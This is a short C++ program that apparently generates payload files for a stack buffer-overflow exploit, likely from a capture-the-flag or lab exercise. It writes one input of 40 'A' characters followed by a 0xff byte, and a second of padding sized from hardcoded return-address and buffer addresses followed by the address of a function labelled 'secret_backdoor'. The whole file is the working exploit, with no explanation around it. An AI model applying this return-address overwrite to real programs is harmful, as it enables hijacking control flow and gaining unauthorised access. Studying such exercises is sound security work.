#include <iostream>
#include <fstream>
#include <sstream>

typedef unsigned int uint;

uint64_t rip = 0x7fffffffe498;
uint64_t bufferAddr = 0x7fffffffe3d0;
uint64_t padding = rip - bufferAddr;
uint64_t addrJump = 0x55555555488c; // secret_backdoor function

void writeShellCode1()
{
	std::ofstream file("args/arg1");

	for (uint i = 0; i < 40; i++)
		file << (char)'A';

	file << (char)0xff;
	file << '\n';
	file.close();
}

void writeShellCode2()
{
	std::ofstream file("args/arg2");

	for (uint i = 0; i < padding; i++)
		file << (char)'A';

	for (int i = 0; i < 8; i++)
		file << ((char *)(&addrJump))[i];
	file << '\n';
	file.close();
}

int main(int argc, char const *argv[])
{
	writeShellCode1();
	writeShellCode2();
	return 0;
}
